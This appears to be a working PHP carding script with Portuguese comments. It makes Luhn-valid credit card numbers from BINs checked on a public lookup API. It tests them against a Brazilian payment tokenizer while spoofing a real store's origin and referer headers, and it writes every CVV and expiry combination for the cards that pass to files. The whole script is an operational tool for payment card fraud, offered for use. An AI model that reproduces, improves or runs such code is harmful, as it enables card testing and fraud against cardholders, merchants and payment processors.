<?php
    error_reporting(0);
    /***
     * ? 1-) PRIMEIRO PASSO IREMOS FAZER A VALIDAÇÃO DO CARTÃO ´ LIVES - CARD'S  - STRIPE ´.
     * ? 2-) SEGUNDO PASSO IREMOS  REALIZAR A CONSULTA DO SALDO DO CARTÃO.
     * ? 3-) TERCEIRO PASSO IREMOS  REALIZAR A APROVAÇÃO DO LIVE.
     * !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
     * * @debug mode - IREMOS REALIZAR A VERIFICAÇÃO DA BIN.
     * * @debug mode - IREMOS REALIZAR A CRIAR O CARTÃO E CVV E DATA.
     * * @debug mode - IREMOS REALIZAR A CHECK NA API PRA VERIFICAR O CARTÃO.
     */
    function MundipaggAPI($bin){
        // ! verification BIN is Valid : https://api.mundipagg.com/bin/v1/$bin
        $date = date("d/m/Y | H:i:s");
        $curl = curl_init();
        curl_setopt_array($curl, array(
        CURLOPT_URL => "https://api.mundipagg.com/bin/v1/$bin",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_MAXREDIRS => -1,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CUSTOMREQUEST => "GET",));
        $response = curl_exec($curl);
        $response = json_decode($response, true);
        curl_close($curl);
        if(strpos($response["brandImage"],"dashboard")){
            $brand = $response["brand"];
            $brandName = $response["brandName"];
            $gaps = $response["gaps"];
            $lenghts = $response["lenghts"];
            $cvv = $response["cvv"];
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m [ > MUNDIPAGG'API < ]  SUCCESS API'S: BIN: $bin | BRAND: $brand | BRANDNAME: $brandName | GAPS: ".count($gaps)." | LENGTHS:  ".count($lenghts)." | CVV: $cvv | > [ $date ] <  "."\e[0m\e[0;32;42m[ • ] \e[0m\n";
            return [$bin,$brand,$brandName,$gaps,$lenghts,$cvv];
        }else{
            echo"\e[1;33;43m[ • ] \e[0m\e[0;43m [ > MUNDIPAGG'API < ]  INVALID API'S: BIN: $bin | BRAND: False | BRANDNAME: False | GAPS: False | LENGTHS:  False | CVV: False | > [ $date ] <  "."\e[0m\e[1;33;43m[ • ] \e[0m\n";
            return false;
        }
    }
    function CreateBin($bin=false){
        // ! Verification for Bin or Create Bin.
        if($bin){
            // ! Checking for Bin.
            $MundipaggAPI = MundipaggAPI($bin);
            return $MundipaggAPI;
        }else{
            /***
             * ! Create Bin for after Checking Bin. [ DIGIT'S <=> 6 ]
             * ! 1-) ESTAREMOS CRIANDO BIN VALIDOS.
             * ? Cartões começados com 1 ou 2: o emissor é uma companhia aérea;
             * ? Cartões começados com 3: emitidos pela indústria de viagens e entretenimento;
             * ? Cartões começados com 4 ou 5: o emissor é uma instituição financeira;
             * ? Cartões iniciados com 6: emitidos por um banco ou um comerciante;
             * ? Cartões iniciados com 7: o emissor é uma indústria de petróleo;
             * ? Cartões iniciados com 8: o emissor é da área de telecomunicações;
             * ? Cartões iniciados com 9 ou 0: são outros emissores, incluindo governos.
             */
            $loop = true;
            while($loop){
                $bin = [];
                $bin = implode("",$bin);
                for ($i=0; $i < 6; $i++){ 
                    $bin[$i] = random_int(0,9);
                }     
                $MundipaggAPI = MundipaggAPI($bin);
                if($MundipaggAPI){
                    $loop = false;
                    return $MundipaggAPI;
                }
            }
        }
    }
    function ApiTokenizer($bin,$card){
        $date = date("d/m/Y | H:i:s");
        $header = [
            'Host: api.tokenizer.pagali.com.br',
            'Content-Length: 92',
            'Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"',
            'Accept: application/json',
            'Content-Type: application/json',
            'X-Pp-Public-Key: reCyuPFDQ7FkQhxovjGjttKQTqvopZN5U5D35DOw4c34dU1Jqs1UMT9O9YhUmPp1AJm8AD12oGJNwp8dXibvIKoxtcTtNVonLwlAWvwvotOymRtox4bydtIc',
            'Sec-Ch-Ua-Mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
            'Sec-Ch-Ua-Platform: "Windows"',
            'Origin: https://www.attractivastore.com.br',
            'Sec-Fetch-Site: cross-site',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Referer: https://www.attractivastore.com.br/',
            'Priority: u=1, i'
        ];
        $post = '{"number":"'.$card.'","holder_name":"Lima Oliver","exp_month":"0'.random_int(0,9).'","exp_year":"202'.random_int(0,9).'"}';
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://api.tokenizer.pagali.com.br/v1/cards",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_MAXREDIRS => -1,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTPHEADER => $header,
            CURLOPT_POSTFIELDS => $post,
            CURLOPT_CUSTOMREQUEST => "POST",));
            $response = curl_exec($curl);
            $response = json_decode($response, true);
            curl_close($curl);
            if(!$response["message"][0]["constraints"]["isCardNumberDocument"]){
                $token = $response["id"];
                if($token){
                    $dates = date("d_m_Y");
                    $dir = "./key/apis/".$dates;
                    $file = "./key/apis/".$dates."/$bin.txt";
                    if(!is_dir($dir)){
                        mkdir($dir);
                    }
                    $CardsFile = fopen($file, "a+");
                    fwrite($CardsFile, "$card\n");
                    fclose($CardsFile);

                }
                echo"\e[0;32;42m[ • ] \e[0m\e[0;42m [ > CREATE CARD | SUCCESS < ] >>> CARD: $card | TOKEN: $token  [ $date ]"."\e[0m\e[0;32;42m[ • ] \e[0m\n";
                return [$card,$token];
            }else{
                echo"\e[0;32;41m[ • ] \e[0m\e[0;41m [ > CREATE CARD | SUCCESS < ] >>> CARD: $card | TOKEN: FALSE  [ $date ]"."\e[0m\e[0;32;41m[ • ] \e[0m\n";
                return false;
            }
    }
    function CreateCard($bin,$lenghts=16){
        /**
         * ! 1-) WE CREATE NUMBER CARDS.
         * ! 2-) WE VERIFICATION CHECKING MATH FOR CARD.
        */
        $loop = true;
        while($loop){
            if($lenghts>16) $lenghts=16;
            $card = [];
            $card_result = [];
            $results = 0;
            for ($i= 0; $i < strlen($bin); $i++){
                $card[$i] = $bin[$i];
            }
            for ($i= strlen($bin); $i < $lenghts; $i++){
                $card[$i] = random_int(0,9);
            }
            for ($i= 0; $i < count($card); $i++){
                if($i==0 or $i%2 ==0){
                    $card_par = $card[$i]*2;
                    if(strlen($card_par)==2){
                        $card_par_one = substr($card_par,0,1);
                        $card_par_two = substr($card_par,1,2);
                        $card_par_soma = $card_par_one+$card_par_two;
                        $card_result[$i] = $card_par_soma;
                    }else{
                        $card_result[$i] = $card_par;
                    }
                }else{
                    $card_impar = $card[$i]*1;
                    $card_result[$i] = $card_impar;
                }
            }
            for ($i= 0; $i < count($card_result); $i++){
                $results =  $card_result[$i] + $results;
            }
            $cards = implode("",$card);
            if($results%10==0){
                $ApiTokenizer = ApiTokenizer($bin,$cards);
                if($ApiTokenizer[1]){ 
                    return $ApiTokenizer;
                }else{
                    break;
                }
            }
        }
    }
    function CheckCard($bin=false,){
        /**
         * ! 1-) CHECKING FOR BIN or CREATE BIN.
         */
        $CreateBin = CreateBin($bin);
        $bin = $CreateBin[0];
        $brand = $CreateBin[1];
        $brandName = $CreateBin[2];
        $gaps = $CreateBin[3];
        $lenghts = count($CreateBin[4]);
        $lenghts = $CreateBin[4][$lenghts-1];
        $cvv = $CreateBin[5];
        $CreateCard = CreateCard($bin,$lenghts);
        if($CreateCard){
            CreateCards($CreateCard[0],$cvv);
        }
    }
    
    function CreateCards($card,$cvv){
        /**
         * ! 1-) IREMOS FAZER A VERIFICAÇÃO DO BIN > 3 or 4.
         * ! 2-) IREMOS VERIFICAR A VALIDADE.
         */
        $date = date("d_m_Y");
        $year = date("Y");
        $month = date("m");
        $day = date("d");
        if($cvv==4){
            $cvv = 1000;
            $cvv_last = 10000;
        }else{
            $cvv = 100;
            $cvv_last = 1000;
        };
        for ($cvv_i = $cvv; $cvv_i < $cvv_last; $cvv_i++){
            for ($month_i= 0; $month_i < 12; $month_i++){
                if(strlen($month_i)==1){
                    $month_i = "0$month_i";
                }
                for ($year_i= $year; $year_i < $year+6; $year_i++){
                    $date = date("d_m_Y");
                    $dir = "./key/card/".$date;
                    $file = "./key/card/".$date."/$card.txt";
                    if(!is_dir($dir)){
                        mkdir($dir);
                    }
                    $SmileFile = fopen($file, "a+");
                    fwrite($SmileFile, "$card|$month_i|$year_i|$cvv_i\n");
                    fclose($SmileFile);
                }
            }
        }
        echo"\e[0;32;42m[ • ] \e[0m\e[0;42m [ > CREATE CARD'S | SUCCESS FILES < ] >>> CARD: $card | SAVE_FILES: ./key/$date/$card.txt | [ $date ]"."\e[0m\e[0;32;42m[ • ] \e[0m\n";
    }
    //CheckCard("405482");
    $loop = 20;
    while($loop){
        CreateCard("405482");
        $loop++;
    }

?>